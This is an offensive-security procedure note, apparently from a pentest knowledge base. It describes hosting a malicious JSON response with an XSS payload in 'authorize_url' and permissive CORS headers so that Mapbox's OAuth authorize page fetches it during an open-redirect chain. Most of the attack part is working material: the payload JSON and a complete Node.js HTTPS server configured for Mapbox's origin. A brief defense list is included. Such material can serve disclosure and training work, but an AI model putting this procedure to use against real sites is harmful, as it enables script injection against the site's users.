---
tags:
  - open-redirect
  - cors
  - json-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:31.329Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: f63f73fe-d204-4ee3-8355-10c98d7caa33
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Setup-Malicious-OAuth-JSON-Server-with-CORS

## Summary

This procedure sets up an HTTPS server to host a malicious JSON response mimicking Mapbox's OAuth stage data, with an injected XSS payload in the 'authorize_url' property, and configures CORS headers to permit fetching from the Mapbox domain, enabling the cross-origin request during the redirect chain.

## Description

In the attack scenario, the attacker controls an HTTPS server that responds to requests from the Mapbox authorize page. The JSON includes a crafted 'authorize_url' that breaks out of the HTML template: {"authorize_url":"'><script>alert(document.domain);</script>","stage":"authorize","user":{"name":"nombre","extraTm2z":17},"origin":""}. CORS headers ensure the fetch succeeds without browser blocking. This is a prerequisite for exploiting the open redirect to deliver the payload. Expected outcome: Server ready to serve the JSON, leading to XSS when rendered unescaped in the template-modal-oauth.

## Requirements

1. HTTPS server (e.g., Node.js with SSL cert or Python with ssl module)
2. Valid SSL certificate for the domain (self-signed acceptable for testing)
3. Network access to host the server publicly

## Defense

Defensive measures and detection strategies:

- Validate and whitelist redirect_uris in OAuth endpoints
- Escape all JSON properties before template insertion
- Monitor for anomalous CORS configurations on external servers

## Objectives

1. Host malicious JSON to inject XSS payload
2. Enable cross-origin fetching from Mapbox
3. Prepare for redirect exploitation

## Instructions

### Step 1: Create Malicious JSON File

**Context**: Prepare the JSON with the XSS payload in authorize_url to break the form tag in the template.

Create the file malicious.json:

```json
{
  "authorize_url": "><script>alert(document.domain);</script>",
  "stage": "authorize",
  "user": {
    "name": "nombre",
    "extraTm2z": 17
  },
  "origin": ""
}
```

> This JSON will be fetched and rendered, with the script tag executing due to lack of escaping.

### Step 2: Deploy HTTPS Server and Set CORS Headers

**Context**: Serve the JSON over HTTPS and add CORS headers to allow requests from https://www.mapbox.com.

Use Node.js example (install express and cors via npm):

```javascript
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const https = require('https');
const app = express();

app.use(cors({
  origin: 'https://www.mapbox.com',
  credentials: true,
  allowedHeaders: ['x-requested-with']
}));

app.get('/malicious.json', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://www.mapbox.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Headers', 'x-requested-with');
  res.json(JSON.parse(fs.readFileSync('malicious.json', 'utf8')));
});

const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

https.createServer(options, app).listen(443);
```

> Run with node server.js. Expected output: Server listening on HTTPS, responds with JSON and headers when fetched.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[cors-bypass]]
